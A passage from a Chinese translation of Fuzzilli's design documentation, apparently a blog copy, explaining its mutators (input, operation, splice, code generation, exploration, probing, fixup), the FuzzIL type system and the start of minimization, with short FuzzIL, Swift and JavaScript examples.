Mutator</h4><p>实现：<code>InputMutator.swift</code></p><p>这是核心数据流变异。 本质上，它只是将指令的输入替换为另一个随机选择的输入：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">SetProperty</span> <span class="hljs-built_in">v3</span>, <span class="hljs-string">&#x27;foo&#x27;</span>, <span class="hljs-built_in">v4</span># <span class="hljs-built_in">v3</span>.foo = <span class="hljs-built_in">v4</span><br></code></pre></td></tr></table></figure><p>可能变成</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">SetProperty</span> <span class="hljs-built_in">v3</span>, <span class="hljs-string">&#x27;foo&#x27;</span>, <span class="hljs-built_in">v2</span># <span class="hljs-built_in">v3</span>.foo = <span class="hljs-built_in">v2</span><br></code></pre></td></tr></table></figure><p>由于 FuzzIL 的设计，特别是所有指令的输入都是变量这一事实，这种变异只需要少量 LOC（Lines of Code, 代码行数）即可实现。</p><h4 id="Operation-Mutator"><a href="#Operation-Mutator" class="headerlink" title="Operation Mutator"></a>Operation Mutator</h4><p>实现：<code>OperationMutator.swift</code></p><p>另一种基本变异，它会变异操作的参数（在 FuzzIL 的文本表示形式中用单引号括起来的值）。 例如：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">v4 &lt;- BinaryOperation v1 &#x27;+&#x27; v2<br></code></pre></td></tr></table></figure><p>可能变成</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">v4 &lt;- BinaryOperation v1 &#x27;/&#x27; v2<br></code></pre></td></tr></table></figure><h4 id="Splicing"><a href="#Splicing" class="headerlink" title="Splicing"></a>Splicing</h4><p>实现：<code>SpliceMutator</code></p><p>拼接背后的想法是将一个程序中自我包含的一部分复制到另一个程序中，以便组合来自不同程序的特性。 考虑以下程序：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">v0 &lt;- LoadInt <span class="hljs-string">&#x27;42&#x27;</span><br>v1 &lt;- LoadFloat <span class="hljs-string">&#x27;13.37&#x27;</span><br>v2 &lt;- LoadBuiltin <span class="hljs-string">&#x27;Math&#x27;</span><br>v3 &lt;- CallMethod v2, <span class="hljs-string">&#x27;sin&#x27;</span>, [v1]<br>v4 &lt;- CreateArray [v3, v3]<br></code></pre></td></tr></table></figure><p>以其最简单的形式，从 <code>CallMethod</code> 指令进行拼接将导致三个中间指令被复制到当前程序中。 这还需要重命名变量，以便它们不与现有变量冲突：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">... 现有代码<br>v13 &lt;- LoadFloat <span class="hljs-string">&#x27;13.37&#x27;</span><br>v14 &lt;- LoadBuiltin <span class="hljs-string">&#x27;Math&#x27;</span><br>v15 &lt;- CallMethod v14, <span class="hljs-string">&#x27;sin&#x27;</span>, [v13]<br>... 现有代码<br></code></pre></td></tr></table></figure><p>也可以进行更复杂的拼接。 例如，Fuzzilli 将概率性地将正在拼接的程序中的一些变量重新映射到宿主程序中的“兼容”变量，以组合两个程序的数据流，因此也可能最终产生以下结果：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">... 现有代码<br>v14 &lt;- LoadBuiltin <span class="hljs-string">&#x27;Math&#x27;</span><br>v15 &lt;- CallMethod v14, <span class="hljs-string">&#x27;sin&#x27;</span>, [v3]<br>... 现有代码<br></code></pre></td></tr></table></figure><p>在这里，拼接算法已决定用现有变量 (v3) 替换 <code>LoadFloat</code> 操作，例如因为该变量也包含一个浮点数。</p><p>拼接变异的一个简单的变体是 <code>CombineMutator</code>，它只是将另一个程序完整地插入到当前变异的程序中。 在这种情况下，拼接本质上是整个程序。</p><h4 id="Code-Generation"><a href="#Code-Generation" class="headerlink" title="Code Generation"></a>Code Generation</h4><p>实现：<code>CodeGenMutator.swift</code></p><p>最终的基本变异是代码生成。 这种变异器在变异程序的单个或多个随机位置生成新的随机代码。</p><p>代码生成是通过“CodeGenerators”执行的：小函数，用于生成特定的代码片段，通常只是单个 FuzzIL 指令，同时（通常）根据需要将现有变量用作输入。 一个非常简单的代码生成器如下所示：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-type">CodeGenerator</span>(<span class="hljs-string">&quot;IntegerGenerator&quot;</span>) &#123; b <span class="hljs-keyword">in</span><br>    b.loadInt(b.genInt())<br>&#125;<br></code></pre></td></tr></table></figure><p>此生成器发出一个 <code>LoadInteger</code> 指令，该指令创建一个包含随机整数值的新变量（从技术上讲，并不完全随机，因为 <code>genInt()</code> 将倾向于一些“有趣的”整数）。 另一个示例代码生成器可能是：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-type">CodeGenerator</span>(<span class="hljs-string">&quot;ComparisonGenerator&quot;</span>, inputs: (.anything, .anything)) &#123; b, lhs, rhs <span class="hljs-keyword">in</span><br>    b.compare(lhs, with: rhs, using: chooseUniform(from: allComparators))<br>&#125;,<br></code></pre></td></tr></table></figure><p>此生成器发出一个比较指令（例如 <code>==</code>），比较两个现有变量（任意类型）。</p><p>默认代码生成器可以在 <code>CodeGenerators.swift</code> 中找到，而自定义代码生成器可以为特定引擎添加，例如触发不同级别的 JITing。</p><p>代码生成器存储在加权列表中，因此使用不同的（当前手动选择的）权重来选择它们。 这允许对生成的代码的分布进行某种程度的控制，例如，大致上执行算术运算或方法调用的频率，或者生成多少控制流（if-else、循环等），相对于数据流。 此外，<code>CodeGenerators</code> 提供了一种简单的方法，通过添加生成过去经常导致错误的特定代码片段（例如原型更改、自定义类型转换回调（例如 valueOf）或索引访问器）的 <code>CodeGenerators</code>，来引导 Fuzzilli 寻找某些错误类型。</p><p>通过代码生成器，最终将生成所有相关的语言功能（例如，对象操作、一元和二元操作等），然后将其保存在语料库中（因为它们触发了新的覆盖范围）并在此后进行进一步变异。</p><h4 id="Exploration"><a href="#Exploration" class="headerlink" title="Exploration"></a>Exploration</h4><p>实现：<code>ExplorationMutator.swift</code></p><p>这种高级变异器使用 JavaScript 中可用的运行时类型信息来执行更智能的变异，特别是确定可以对现有值执行的可能操作。 它执行以下操作：</p><ol><li>它为要变异的程序中的随机现有变量插入 <code>Explore</code> 操作</li><li>它执行生成的（临时）程序。 <code>Explore</code> 操作将被提升为一段代码，该代码在运行时检查变量（使用 JavaScript 中的“typeof”和“Object.getOwnPropertyNames”等功能），并选择要对其执行的“有用”操作（例如，加载属性、调用方法等），然后报告它做了什么</li><li>变异器处理步骤 2 的输出，并将一些 <code>Explore</code> 变异替换为运行时选择的具体操作。 所有其他 <code>Explore</code> 操作都将被丢弃</li></ol><p>结果是一个程序，即使在静态未知其类型的情况下，也可以对一些现有变量执行有用的操作。 结果程序也是确定性的和“JIT 友好”的，因为它不再依赖于任何类型的运行时对象检查。</p><h4 id="Probing"><a href="#Probing" class="headerlink" title="Probing"></a>Probing</h4><p>实现：<code>ProbingMutator.swift</code></p><p>这是另一种运行时辅助变异器，它试图确定现有值的使用方式。 特别是，它试图确定某个对象上是否应该存在某些属性。 这种变异器执行以下操作：</p><ol><li>它为要变异的程序中的随机现有变量插入 <code>Probe</code> 操作</li><li>它执行生成的（临时）程序。 <code>Probe</code> 操作将被提升为一段代码，该代码将对象（实际上是对象的原型）替换为 <code>Proxy</code>，然后记录对不存在的属性的所有访问。 然后将这些列表发送回 Fuzzilli。</li><li>变异器处理步骤 2 的输出并安装一些缺失的属性和回调。</li></ol><p>这种变异器因此实现了几件事：</p><ul><li>它可以自动检测操作是否触发回调，然后可以安装回调函数。 例如，这可以帮助查找与意外回调相关的错误。</li><li>它可以确定内置 API 的工作方式以及它期望的参数类型。 例如，许多 API 需要“配置”对象，这些对象应该具有某些键。 这种变异器可以确定这些键是什么，从而可以以一种有用的方式调用这些 API。</li><li>它可以使现有代码更有用。 例如，我们可能已经有一个在对象参数上运行但访问不存在的属性的 jit 优化函数，这可能不是很有用。 这种变异器可以确保这些属性存在，从而使整个程序更有意义。</li></ul><h4 id="FixupMutator"><a href="#FixupMutator" class="headerlink" title="FixupMutator"></a>FixupMutator</h4><p>实现：<code>FixupMutator.swift</code></p><p>这是最后的运行时辅助变异器。 它的目标是修复&#x2F;改进现有代码。 特别是，它想要</p><ul><li>删除不必要的 try-catch 块和保护</li><li>修复对不存在的属性和元素的访问（待办）</li><li>修复无效的函数、方法或构造函数调用（待办）</li><li>修复导致 NaN 的算术运算，这通常表明没有执行有意义的操作（待办）</li></ul><p>除了第一个之外，所有这些都尚未实现，因此此变异器仍在开发中。</p><p><code>FixupMutator</code> 是将受保护操作转换为不受保护操作的两种方式之一（通常首选后者）。</p><h3 id="类型系统和类型推断"><a href="#类型系统和类型推断" class="headerlink" title="类型系统和类型推断"></a>类型系统和类型推断</h3><p>实现：<code>TypeSystem.swift</code> 和 <code>JSTyper.swift</code></p><p>到目前为止，代码生成器只是一个简单的函数，它获取零个或多个随机输入变量并生成一些新的 FuzzIL 指令来对它们执行一些操作。 现在考虑以下假想的代码生成器：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-type">CodeGenerator</span>(<span class="hljs-string">&quot;FunctionCallGenerator&quot;</span>) &#123; b <span class="hljs-keyword">in</span><br>    <span class="hljs-keyword">let</span> function <span class="hljs-operator">=</span> b.randomVariable()<br>    <span class="hljs-keyword">let</span> arguments <span class="hljs-operator">=</span> [b.randomVariable(), b.randomVariable(), b.randomVariable()]<br>    b.callFunction(f, with: arguments)<br>&#125;<br></code></pre></td></tr></table></figure><p>此生成器选择一个随机的、当前可见的变量，然后将其作为带有三个随机参数的函数调用。</p><p>这里的问题是，由于在任何给定时间只有少量变量实际上是函数，因此此生成器最终会生成大量无效的函数调用，例如以下内容：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">v3 &lt;- LoadString <span class="hljs-string">&quot;foobar&quot;</span><br>v4 &lt;- CallFunction v3, []<br><span class="hljs-comment">// TypeError: v3 is not a function</span><br></code></pre></td></tr></table></figure><p>这将导致抛出运行时异常，然后导致程序的其余部分不被执行，并且该程序被认为是无效的。</p><p>为了解决这个问题，Fuzzilli 实现了相对简单的类型推断，它尝试在 <code>ProgramBuilder</code> 构建程序时推断每个变量的可能类型。 这（可能）比听起来容易，因为解释器只需要在大多数时候是正确的（它基本上是一种优化），而不是总是正确的。 这大大简化了实现，因为许多具有复杂效果的操作（例如原型更改）在很大程度上可以忽略。 例如，考虑推断 typeof、instanceof 和比较操作结果的规则：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">case</span> <span class="hljs-keyword">is</span> <span class="hljs-type">TypeOf</span>:<br>    <span class="hljs-keyword">set</span>(instr.output, environment.stringType)<br><br><span class="hljs-keyword">case</span> <span class="hljs-keyword">is</span> <span class="hljs-type">InstanceOf</span>:<br>    <span class="hljs-keyword">set</span>(instr.output, environment.booleanType)<br><br><span class="hljs-keyword">case</span> <span class="hljs-keyword">is</span> <span class="hljs-type">Compare</span>:<br>    <span class="hljs-keyword">set</span>(instr.output, environment.booleanType)<br></code></pre></td></tr></table></figure><p>为了正确推断内置对象、方法和函数的类型，类型推断依赖于 JavaScript 运行时环境的静态模型，该模型可以例如告诉解释器 eval 内置函数是一个期望单个参数的函数，Object 内置函数是一个具有各种方法的对象，或者 Uint8Array 内置函数是一个返回 Uint8Array 实例的构造函数，然后该实例具有一组特定的属性和方法。</p><p>FuzzIL 的设计旨在使类型推断尽可能简单。 例如，考虑 ES6 类的实现。 在 FuzzIL 中，它们看起来大致像这样：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs clean">v0 &lt;- BeginClassDefinition<br>ClassAddInstanceProperty <span class="hljs-string">&quot;foo&quot;</span>, v5<br>BeginClassInstanceMethod <span class="hljs-string">&quot;bar&quot;</span> -&gt; v8 (this), v9<br>    ... <span class="hljs-keyword">implementation</span> <span class="hljs-keyword">of</span> method <span class="hljs-string">&quot;bar&quot;</span><br>EndClassInstanceMethod<br>BeginClassInstanceMethod <span class="hljs-string">&quot;baz&quot;</span> -&gt; v6 (this)<br>    ... <span class="hljs-keyword">implementation</span> <span class="hljs-keyword">of</span> method <span class="hljs-string">&quot;baz&quot;</span><br>EndClassInstanceMethod<br>EndClassDefinition<br></code></pre></td></tr></table></figure><p>根据这些，从 FuzzIL 代码推断类实例的类型相当简单：<code>.object(withProperties: [&quot;foo&quot;], withMethods: [&quot;bar&quot;, &quot;baz&quot;])</code>。</p><p>有了可用的类型信息，上面的 <code>CodeGenerator</code> 现在可以请求一个包含函数的变量，并且还可以尝试查找与函数的参数类型兼容的变量：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-type">CodeGenerator</span>(<span class="hljs-string">&quot;FunctionCallGenerator&quot;</span>) &#123; b <span class="hljs-keyword">in</span><br>    <span class="hljs-keyword">let</span> function <span class="hljs-operator">=</span> b.randomVariable(ofType: .function())<br>    <span class="hljs-keyword">let</span> arguments <span class="hljs-operator">=</span> b.randomArguments(forCalling: function)<br>    b.callFunction(f, with: arguments)<br>&#125;<br></code></pre></td></tr></table></figure><p>但是，即使进行了此更改，如果参数值具有错误的类型，函数调用仍然会引发异常。 Fuzzilli 尝试通过两种方式来处理这个问题：</p><ol><li>如果函数的类型已知（即其签名已知），<code>randomArguments(forCalling:)</code> 将尝试查找合适的参数。</li><li>如果没有找到匹配的参数（或者如果签名未知），生成器可以选择将调用操作标记为“受保护”。 这将导致在提升期间将其包装在 try-catch 中。</li></ol><p>重要的是要注意，对于基于变异的模糊测试，<code>JSTyper</code> 和类型系统应被视为优化，而不是基本功能，因此模糊器仍然应该能够在没有类型信息的情况下运行。 此外，虽然使用类型信息进行变异可以提高模糊器的性能（产生较少明显不正确的样本），但过度依赖它可能会限制模糊器，从而对性能产生负面影响（产生较少多样化的样本）。 一个例子是 <code>InputMutator</code>，它可以选择是类型感知的，在这种情况下，它将尝试找到“兼容的”替换变量。 为了不过多地限制模糊器，Fuzzilli 的 <code>MutationEngine</code> 目前配置为同时使用非类型感知的 <code>InputMutator</code> 和类型感知的 <code>InputMutator</code>。</p><h4 id="类型系统"><a href="#类型系统" class="headerlink" title="类型系统"></a>类型系统</h4><p>实现：<code>TypeSystem.swift</code></p><p>为了完成它的工作，<code>JSTyper</code> 需要一个类型系统。 FuzzIL 的类型系统旨在支持两个主要用例：</p><ol><li>确定可以对给定变量执行的操作。 例如，类型系统需要说明对象上哪些属性和方法可用，以及它们的类型和签名是什么。</li><li>为给定操作找到一个兼容的变量。 例如，一个函数可能需要某种参数类型，例如 <code>Number</code> 或 <code>Uint8Array</code>。 类型系统必须能够表达这些类型，并且能够识别存储这种类型或子类型的值的变量。 例如，当需要 <code>Uint8Array</code> 时，可以使用具有附加属性的 <code>Uint8Array</code>，当需要父类时，可以使用子类的对象。</li></ol><p>这两种操作都需要高效，因为它们将经常执行。</p><p>类型系统围绕<code>位集</code>构建，基本类型分别由 32 位整数中的单个位表示：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> nothing     <span class="hljs-operator">=</span> <span class="hljs-type">BaseType</span>([])<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> undefined   <span class="hljs-operator">=</span> <span class="hljs-type">BaseType</span>(rawValue: <span class="hljs-number">1</span> <span class="hljs-operator">&lt;&lt;</span> <span class="hljs-number">0</span>)<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> integer     <span class="hljs-operator">=</span> <span class="hljs-type">BaseType</span>(rawValue: <span class="hljs-number">1</span> <span class="hljs-operator">&lt;&lt;</span> <span class="hljs-number">1</span>)<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> bigint      <span class="hljs-operator">=</span> <span class="hljs-type">BaseType</span>(rawValue: <span class="hljs-number">1</span> <span class="hljs-operator">&lt;&lt;</span> <span class="hljs-number">2</span>)<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> float       <span class="hljs-operator">=</span> <span class="hljs-type">BaseType</span>(rawValue: <span class="hljs-number">1</span> <span class="hljs-operator">&lt;&lt;</span> <span class="hljs-number">3</span>)<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> boolean     <span class="hljs-operator">=</span> <span class="hljs-type">BaseType</span>(rawValue: <span class="hljs-number">1</span> <span class="hljs-operator">&lt;&lt;</span> <span class="hljs-number">4</span>)<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> string      <span class="hljs-operator">=</span> <span class="hljs-type">BaseType</span>(rawValue: <span class="hljs-number">1</span> <span class="hljs-operator">&lt;&lt;</span> <span class="hljs-number">5</span>)<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> regexp      <span class="hljs-operator">=</span> <span class="hljs-type">BaseType</span>(rawValue: <span class="hljs-number">1</span> <span class="hljs-operator">&lt;&lt;</span> <span class="hljs-number">6</span>)<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> object      <span class="hljs-operator">=</span> <span class="hljs-type">BaseType</span>(rawValue: <span class="hljs-number">1</span> <span class="hljs-operator">&lt;&lt;</span> <span class="hljs-number">7</span>)<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> function    <span class="hljs-operator">=</span> <span class="hljs-type">BaseType</span>(rawValue: <span class="hljs-number">1</span> <span class="hljs-operator">&lt;&lt;</span> <span class="hljs-number">8</span>)<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> constructor <span class="hljs-operator">=</span> <span class="hljs-type">BaseType</span>(rawValue: <span class="hljs-number">1</span> <span class="hljs-operator">&lt;&lt;</span> <span class="hljs-number">9</span>)<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> iterable    <span class="hljs-operator">=</span> <span class="hljs-type">BaseType</span>(rawValue: <span class="hljs-number">1</span> <span class="hljs-operator">&lt;&lt;</span> <span class="hljs-number">10</span>)<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> anything    <span class="hljs-operator">=</span> <span class="hljs-type">BaseType</span>([.undefined, .integer, .float, .string, .boolean, .object, .function, .constructor, .bigint, .regexp, .iterable])<br></code></pre></td></tr></table></figure><p>每个基本类型都表示可以在其类型的某个值上执行某些操作（用例 1）。 例如，数值类型表示可以在其值上执行算术运算，<code>.iterable</code> 类型表示可以迭代该值（例如，通过 for-of 循环或使用扩展运算符），<code>.object</code> 类型表示该值具有可以访问的属性和方法，<code>.function</code> 类型表示可以使用函数调用来调用该值。</p><p>附加类型信息，例如属性和方法、函数的签名或数组的元素类型，存储在“类型扩展”对象中，这些对象可以在多个 <code>Type</code> 结构之间共享（以减少内存消耗）。</p><p>可以使用三个运算符组合基本类型以形成更复杂的类型：并集、交集和合并。 接下来将讨论这些。</p><h5 id="Union-Operator"><a href="#Union-Operator" class="headerlink" title="Union Operator"></a>Union Operator</h5><p>Operator: <code>|</code> (按位或)</p><p>并集表示变量具有一种类型或另一种类型：类型 <code>t1 | t2</code> 表示值是 <code>t1</code> 或 <code>t2</code>。</p><p>在 Fuzzilli 中，并集类型经常作为函数的输入或输出类型出现。 例如，<code>String.prototype.replace</code> 方法可以将正则表达式对象或字符串作为第一个参数：<code>&quot;replace&quot; : [.string | .jsRegExp, .string] =&gt; .jsString</code>。 此外，由于条件执行，也会出现并集类型：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> v4 = <span class="hljs-number">42</span>; <span class="hljs-comment">// .integer</span><br><span class="hljs-keyword">if</span> (v2) &#123;<br>    v4 = <span class="hljs-string">&quot;foobar&quot;</span>; <span class="hljs-comment">// .string</span><br>&#125;<br><span class="hljs-comment">// v4 = .integer | .string</span><br></code></pre></td></tr></table></figure><h5 id="Intersection-Operator"><a href="#Intersection-Operator" class="headerlink" title="Intersection Operator"></a>Intersection Operator</h5><p>运算符：<code>&amp;</code>（按位与）</p><p>交集运算符计算两个（并集）类型之间的交集。 例如，<code>t1 | t2</code> 与 <code>t1 | t3</code> 的交集是 <code>t1</code>。</p><p>在 Fuzzilli 中，此运算符用于确定变量是否可能具有某种类型，例如它是否可能是 <code>BigInt</code>，在这种情况下，许多算术运算符的结果类型也应包括 <code>BigInt</code>。</p><h5 id="Merge-Operator"><a href="#Merge-Operator" class="headerlink" title="Merge Operator"></a>Merge Operator</h5><p>运算符：<code>+</code> (加号)</p><p>这个运算符可能是最不直观的，并且可能对这个类型系统来说是独一无二的。</p><p>本质上，如果一个变量具有合并类型 <code>t1 + t2</code>，那么它同时是两种输入类型。 因此，只要需要原始类型之一，就可以使用它。 为了理解为什么这可能有用，请考虑一些常见的 JavaScript 值：</p><ul><li><strong>字符串：<code>&quot;foobar&quot;</code></strong> 虽然 JavaScript 字符串显然是“字符串”类型，这意味着例如它可以用于进行字符串连接，但它也是一个具有属性（例如 <code>.length</code>）和方法（例如 <code>.charCodeAt</code>）的对象。 此外，它也表现为数组，因为它可以迭代和扩展。 因此，JavaScript 字符串的类型将是 <code>.string + .object(...) + .array</code></li><li><strong>函数：<code>function foo(...) &#123; ... &#125;</code></strong> JavaScript 函数既是函数（可以调用），又是对象（具有属性和方法）。 因此，类型将是 <code>.function(...) + .object(...)</code></li><li><strong>数组：<code>[ ... ]</code></strong> JavaScript 数组是可迭代的，但也包含属性和方法，因此表示为 <code>.array + .object(...)</code>。</li></ul><p>本质上，合并类型允许 FuzzIL 对 JavaScript 语言的动态特性进行建模，特别是经常执行的隐式类型转换以及许多事物（也）是对象这一事实。</p><h5 id="Type-Subsumption"><a href="#Type-Subsumption" class="headerlink" title="Type Subsumption"></a>Type Subsumption</h5><p>运算符：<code>&lt;=</code> 和 <code>&gt;=</code></p><p>为了支持类型查询（用例 2），类型系统实现了类型之间的蕴含关系。 这可以被认为是“是”关系，并且通常应该在搜索给定类型约束的“兼容”变量时使用。</p><p>一般的蕴含规则是：</p><ul><li>基本类型只蕴含自身（整数是整数但不是字符串）</li><li>并集 <code>t1 | t2</code> 蕴含 <code>t1</code> 和 <code>t2</code>（字符串是“字符串或数字”）</li><li>合并类型 <code>t1 + t2</code> 被 <code>t1</code> 和 <code>t2</code> 蕴含（JavaScript 函数既是函数又是具有属性和方法的对象）</li><li>继承关系（包括添加的属性&#x2F;方法）按预期工作：具有附加属性的 <code>Uint8Array</code> 仍然是 <code>Uint8Array</code>。 子类的实例也是父类的实例。</li></ul><h5 id="Implementation-Details"><a href="#Implementation-Details" class="headerlink" title="Implementation Details"></a>Implementation Details</h5><p>类型实现为两个 32 位整数，一个存储明确类型，一个存储可能类型。 根据经验，明确类型通过合并增长，而可能类型通过并集增长。</p><p>由于这种表示形式，类型通常只能是并集类型或合并类型。 例如，不可能（如果尝试，将会导致运行时错误）合并并集类型，因为这无法正确表示。 然而，在实践中，这是不需要的，因此没有问题。 支持Union Merged types，但是，结果通常太宽泛。 例如，类型 <code>(t1 + t2) | (t3 + t4)</code> 将与类型 <code>t1 | t2 | t3 | t4</code> 无法区分。 因此，结果类型比必要的更宽泛，但仍然是正确的，因为结果类型蕴含两个输入类型。 同样，在实践中，这并不重要，因为这种情况仅在条件执行期间发生，在这种情况下，结果类型可能无论如何都无法以有意义的方式使用（它不能保证是任何类型，因此在需要其中一种类型时不能使用）。</p><h5 id="Type-Examples"><a href="#Type-Examples" class="headerlink" title="Type Examples"></a>Type Examples</h5><p>为了更好地理解 FuzzIL 的类型系统，本节展示了一些常见的 JavaScript 值以及它们在 FuzzIL 中对应的类型。 也可以通过使用 <code>--inspect=types</code> 标志来检查这一点。 如果启用，写入磁盘的程序将包含变量类型的注释。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> v0 = <span class="hljs-string">&quot;foobar&quot;</span>;<br><span class="hljs-comment">// .string + .object(...) + .array</span><br><span class="hljs-comment">// the object part contains all the standard string methods and properties</span><br><br><span class="hljs-keyword">let</span> v0 = &#123; <span class="hljs-title function_">valueOf</span>(<span class="hljs-params"></span>) &#123; ...; <span class="hljs-keyword">return</span> <span class="hljs-number">13.37</span>; &#125;&#125;;<br><span class="hljs-comment">// .object(...) + .float</span><br><span class="hljs-comment">// The object can be used for numerical operations since it has a meaningful</span><br><span class="hljs-comment">// conversion operator defined (a custom valueOf method with known signature).</span><br><span class="hljs-comment">// Note: this is not yet implemented, currently the type would just be .object</span><br><br><span class="hljs-keyword">let</span> v0 = [...];<br><span class="hljs-comment">// .array + .object(...)</span><br><span class="hljs-comment">// the JavaScript array is clearly an array (can be iterated over) but also</span><br><span class="hljs-comment">// exposes properties and methods and as such is also an object</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">v0</span> &#123; ... <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>) &#123; ... &#125;; <span class="hljs-title function_">bar</span>(<span class="hljs-params"></span>) &#123; ... &#125; &#125;;<br><span class="hljs-comment">// .constructor([...] =&gt; .object(...))</span><br><span class="hljs-comment">// The variable v0 is a constructor with the parameters indicated by its</span><br><span class="hljs-comment">// constructor and which returns an object of the v0 &quot;group&quot; with certain</span><br><span class="hljs-comment">// properties and methods (e.g. foo and bar)</span><br></code></pre></td></tr></table></figure><h3 id="The-Mutation-Engine"><a href="#The-Mutation-Engine" class="headerlink" title="The Mutation Engine"></a>The Mutation Engine</h3><p>实现: <code>MutationEngine.swift</code>（–engine&#x3D;mutation）</p><p>本节将解释 Fuzzilli 的变异引擎是如何工作的。 为此，它首先介绍变异引擎的三个缺失组件，即最小化器、语料库和覆盖率收集，然后解释变异引擎使用的高级模糊测试算法。</p><h4 id="Minimization"><a href="#Minimization" class="headerlink" title="Minimization"></a>Minimization</h4><p>实现：<code>Minimization/</code> </p><p>Fuzzilli 执行的变异都有一个共同点：它们只能增加 FuzzIL 程序的大小（指令数量），而永远不会减小它。 因此，经过多轮变异后，程序最终会变得太大而无法在时限内执行。 此外，如果不从有趣的程序中删除不必要的功能，未来变异的效率会降低，因为许多变异将被“浪费”在变异不相关的代码上。 因此，Fuzzilli 需要一个最小化器，在程序插入语料库之前删除程序中不必要的代码。</p><p>最小化在概念上很简单：<strong>Fuzzilli 尝试识别和删除触发新发现的覆盖边缘不需要的指令</strong> 。 在最简单的情况下，这意味着删除单个指令，然后重新运行程序以查看它是否仍然触发新的边缘。 还有一些专门的最小化过程。 例如，有一个内联简化器，它尝试将函数内联到它们的调用点。 这是必要的，否则代码模式，例如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">v1</span>(<span class="hljs-params">...</span>) &#123;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">v2</span>(<span class="hljs-params">...</span>) &#123;<br>        <span class="hljs-keyword">function</span> <span class="hljs-title function_">v3</span>(<span class="hljs-params">...</span>) &#123;<br>        &#125;<br>        <span class="hljs-title function_">v3</span>(...);<br>    &#125;<br>    <span class="hljs-title 